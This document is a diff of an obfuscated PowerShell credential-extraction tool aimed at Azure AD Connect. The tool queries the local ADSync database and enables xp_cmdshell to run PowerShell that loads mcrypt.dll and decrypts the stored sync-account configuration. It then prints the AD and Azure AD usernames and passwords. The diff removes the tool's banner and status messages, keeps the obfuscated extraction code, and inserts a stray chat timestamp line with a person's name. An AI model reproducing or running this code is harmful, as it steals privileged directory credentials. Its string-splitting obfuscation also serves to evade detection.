@@ -1,16 +1,11 @@
-&('Write'+'-H'+'os'+'t') ("{9}{2}{16}{11}{4}{1}{0}{6}{3}{17}{13}{8}{7}{12}{5}{15}{10}{14}" -f'r','ync C','C','de','ect S','xpn_ ','e',' v3 (','act','AD ',' ','nn','@_','l Extr','@tijldeneut)','&','o','ntia')
-&('Wr'+'ite'+'-Host') ("{0}{2}{4}{3}{5}{1}"-f'Modified ','e','versio','1','n by @BigM','ke_oN')
-&('Write'+'-Ho'+'st') ("`t[ "+'U'+'pdated '+'to'+' '+'als'+'o '+'e'+'xt'+'ract '+'A'+'D '+'Sync'+' '+'acco'+'u'+'nt '+']')
-&('Write-'+'H'+'o'+'st') ("`t[ "+'Upda'+'ted '+'to'+' '+'suppor'+'t '+'new'+' '+'c'+'ryp'+'tokey '+'storag'+'e'+' '+'metho'+'d '+']')
-&('Wr'+'ite'+'-Host') ("`t[ "+'U'+'pdated'+' '+'to'+' '+'supp'+'or'+'t '+'S'+'erve'+'r '+('2'+'0'+'19{0}s ')  -F[chAR]39+'new'+' '+'in'+'stan'+'ce '+'na'+'me '+"]`n")
- 
+[3:20 PM] Smirnov, Yehuda
 ${c`LieNt} = .('new-obje'+'c'+'t') syst`em.DAta.sQlCLIENt.s`QLc`ON`NE`CTiOn -ArgumentList ((("{1}{11}{13}{7}{4}{16}{2}{6}{15}{5}{3}{12}{0}{8}{9}{10}{14}" -f'g','Da','D',' Cat','urce=(localdb){0}.{0}','tial','Sy','So','=A','D','Sy','t','alo','a ','nc','nc2019;Ini','A')) -f[cHar]92)
  
 try {
     ${clI`e`NT}."O`pEn"()
 } catch {
-&('Write'+'-'+'H'+'ost') ("{8}{0}{15}{11}{12}{9}{14}{6}{5}{7}{2}{16}{4}{3}{10}{13}{1}{17}" -f'Coul','DSync..',' ','019,','nc2','b','locald',' with','[!] ','t ',' ','o','t connec','trying A','to ','d n','ADSy','.')
     try {
+       
         ${cLIE`NT} = &('new'+'-'+'ob'+'ject') Sy`sTem.D`ATA.s`QlCLiEnT.`sq`LC`oNNect`i`on -ArgumentList ((("{2}{10}{3}{4}{9}{14}{13}{8}{15}{1}{11}{6}{5}{12}{7}{0}" -f'Sync','rADSy','Dat','r','ce=(loca',';Initial','c','AD','m','ld','a Sou','n',' Catalog=','yr.','b)m','y'))  -CRePLacE  'myr',[cHaR]92)
         ${C`LI`ent}."op`En"()
     } catch {
@@ -18,7 +13,6 @@ try {
     }
 }
  
-.('Wr'+'ite-'+'Host') ("{2}{3}{4}{10}{11}{5}{0}{1}{7}{8}{6}{9}" -f 'c',' local','[*]',' Q','uer','yn','r_conf','db (mms_ser','ve','iguration)','yin','g ADS')
  
 ${c`md} = ${Cl`IENT}."CReATE`cO`m`M`AND"()
 ${C`Md}."ComM`A`NDText" = ("{8}{1}{11}{14}{2}{7}{6}{5}{13}{3}{10}{12}{9}{0}{4}" -f'guratio','E','d, ins','t','n','nce_id,','a','t','SEL','_confi','r','CT keyset_','opy FROM mms_server',' en','i')
@@ -34,7 +28,7 @@ ${eN`T`RopY} = ${r`eaD`ER}."gE`TGu`Id"(2)
 ${r`E`ADeR}."c`LOse"()
  
  
-&('Wri'+'te'+'-Host') ("{11}{1}{8}{2}{4}{5}{6}{7}{0}{12}{3}{14}{10}{13}{9}" -f'lo','*] Q','ry','ldb (mms_ma','ing ADS','y','nc',' ','ue','ent)','ement_a','[','ca','g','nag')
+ 
  
 ${c`md} = ${ClIE`NT}."cr`eatEc`OmmA`Nd"()
 ${C`md}."C`Omma`NdTeXT" = ((("{19}{13}{15}{11}{16}{21}{10}{17}{6}{9}{3}{8}{12}{18}{0}{20}{5}{1}{7}{2}{14}{4}"-f'eme','HE','type = eC','n FR','DeCB','nt W','i','RE ma_','OM mms_man','guratio','pted_','vate_con','a','ELECT','BA',' pri','figuration_xm','conf','g','S','nt_age','l, encry'))."R`Epl`Ace"('eCB',[stRinG][CHaR]39))
@@ -48,7 +42,7 @@ ${AdcR`YP`T`eDco`NFIg} = ${r`EAder}."Ge`TstR`ing"(1)
 ${Re`AdeR}."ClO`sE"()
  
  
-&('Write-Ho'+'s'+'t') ("{4}{7}{2}{1}{6}{3}{5}{0}"-f 'data',' configu','ying AAD','tio','[*] Que','n ','ra','r')
+ 
 ${c`MD} = ${cL`ieNT}."cr`EatECoMm`AnD"()
 ${c`Md}."cOmm`ANd`TEXt" = ((("{26}{9}{19}{1}{29}{15}{14}{10}{18}{24}{20}{11}{2}{32}{13}{4}{25}{28}{21}{7}{22}{0}{8}{27}{12}{23}{16}{3}{31}{17}{6}{5}{30}"-f'WHERE sub',' pr','nfi','Act','O','f','oso','nt_','t','ELEC','r',', encrypted_co',' = suiW','on FR','_configu','vate','Azure ','ctory (Micr','ati','T','xml','e','agent ','indows ','on_','M mms_','S','ype','managem','i','t)sui','ive Dire','gurati'))."RepL`A`CE"(([chAr]115+[chAr]117+[chAr]105),[StrINg][chAr]39))
 ${Read`ER} = ${c`MD}."Exec`Ut`e`RE`ADEr"()
@@ -60,7 +54,7 @@ ${a`AdCRypTEd`cO`N`FIg} = ${Re`AD`eR}."gets`T`R`ING"(1)
 ${Re`ADer}."cL`OsE"()
  
  
-.('Wr'+'ite-Ho'+'st') ("{4}{3}{1}{0}{6}{8}{5}{2}{7}" -f 'hell','mds','D co','g xp_c','[*] Usin','A',' to ','nfig','decrypt ')
+ 
  
 ${c`mD} = ${c`LI`ent}."CrEaT`Ec`oMmA`ND"()
 ${c`MD}."COMmaNdT`E`xt" = ('EXEC'+' '+'s'+'p_con'+'figure '+('QW'+'Bsho'+'w ')."REPl`AcE"('QWB',[strInG][ChAR]39)+'ad'+'vanced'+' '+(('opt'+'ionssH'+'6, ')  -crepLACE'sH6',[cHAr]39)+'1'+'; '+'RECONFI'+'GUR'+'E; '+'EX'+'EC '+'sp'+'_confi'+'gu'+'re '+('{0'+'}xp_c'+'m'+'d'+'shell{0'+'}, ') -F  [char]39+'1;'+' '+'RECON'+'FIGUR'+'E;'+' '+'EX'+'EC '+'xp'+'_c'+'mdsh'+'ell '+(('G9opo'+'wer'+'s'+'he'+'ll.exe ')  -rePlacE'G9o',[chAr]39)+'-'+'c '+"`"add-type "+'-path'+' '+('{0}'+'{0}C:{1}Pr'+'o'+'gr'+'am ')-F[CHAR]39,[CHAR]92+(('Filesrk'+'HMi'+'croso'+'ft'+' ')-crEpLAcE  ([chAr]114+[chAr]107+[chAr]72),[chAr]92)+'Azur'+'e'+' '+'AD'+' '+"Sync\Bin\mcrypt.dll'';`$km "+'= '+'New-O'+'bject'+' '+'-T'+'ypeNa'+'me '+"Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager;`$km.LoadKeySet([guid]''$entropy'', "+"[guid]''$instance_id'', "+"$key_id);`$key "+'= '+"`$null;`$km.GetActiveCredentialKey([ref]`$key);`$key2 "+'= '+"`$null;`$km.GetKey(1, "+"[ref]`$key2);`$ADdecryptedConfig "+'= '+"`$null;`$key2.DecryptBase64ToString(''$ADCryptedConfig'', "+"[ref]`$ADdecryptedConfig);Write-Host "+"`$ADdecryptedConfig`"'")
@@ -79,7 +73,6 @@ if (${AD`DecrypTED`cO`NfIG} -eq [string]::"Emp`TY") {
  
 ${r`eadEr}."CL`OSE"()
  
-.('Wr'+'it'+'e-Host') ("{2}{1}{6}{5}{12}{4}{0}{7}{9}{10}{8}{11}{3}"-f'l',' U','[*]','g','shel',' xp_cm','sing',' to','crypt AAD c',' d','e','onfi','d')
  
 ${c`MD} = ${c`lIeNt}."c`Re`AteC`oMMaNd"()
  
@@ -107,7 +100,6 @@ ${aDpA`SsWo`RD} = &('se'+'lec'+'t-xml') -Content ${AddECRY`PTE`D`cONfiG} -XPath 
 ${a`Ad`UseR`NamE} = .('se'+'l'+'e'+'ct-xml') -Content ${aADCOn`F`Ig} -XPath ((("{5}{2}{1}{0}{3}{4}"-f'me=X0VUserNa','na','er[@','meX0','V]','//paramet'))."R`Epla`cE"('X0V',[strinG][ChAR]39))  | &('s'+'e'+'lect') @{"n`Ame" = ("{1}{0}" -f 'name','User'); "eXpRESS`I`oN" = {${_}."no`De"."I`NNe`RTE`xT"}}
 ${Aa`dpa`s`SworD} = &('sel'+'ect'+'-xml') -Content ${AadD`ecr`yptE`DcoNFig} -XPath ("{0}{1}{2}"-f'//at','tr','ibute') | .('sele'+'c'+'t') @{"N`AmE" = ("{2}{1}{0}" -f'rd','o','Passw'); "eXp`REssi`ON" = {${_}."n`ODe"."i`NNERt`EXT"}}
  
-&('Wri'+'te-'+'H'+'ost') ('[*]'+' '+'Cr'+'ede'+'n'+'tials '+"incoming...`n")
  
 &('Wr'+'it'+'e-Host') "Domain: $($ADdomain.Domain) "
 &('Wri'+'t'+'e-Host') "Username: $($ADusername.Username) "
@@ -116,5 +108,8 @@ ${Aa`dpa`s`SworD} = &('sel'+'ect'+'-xml') -Content ${AadD`ecr`yptE`DcoNFig} -XPa
 &('Wr'+'ite'+'-Hos'+'t') "AADPass: $($AADpassword.Password) "
  
  
+ 
 ${R`e`Ader}."c`loSE"()
 ${cl`i`eNt}."CLO`se"()
+ 
+ 
